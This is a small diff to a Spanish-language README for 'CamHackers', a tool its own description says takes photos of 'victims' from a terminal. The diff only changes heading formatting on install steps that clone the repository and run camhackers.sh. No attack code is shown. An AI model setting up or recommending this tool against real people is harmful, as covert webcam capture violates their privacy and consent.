@@ -6,19 +6,19 @@ tomar fotos a las victimas desde una terminal,(solo se ha probado en kali)
 ![alt text](images/test2.jpeg)
 # INSTALACION
 
-# sudo apt-get update
+### sudo apt-get update
 
-# sudo apt-get upgrade
+### sudo apt-get upgrade
 
-# sudo apt-get install ssh
+### sudo apt-get install ssh
 
-# sudo apt-get install php
+### sudo apt-get install php
 
-# sudo apt-get install git
+### sudo apt-get install git
 
-# git clone https://github.com/bythelink89/CamHackers.git
+### git clone https://github.com/bythelink89/CamHackers.git
 
-# cd CamHackers
+### cd CamHackers
 
-# bash camhackers.sh
+### bash camhackers.sh
 
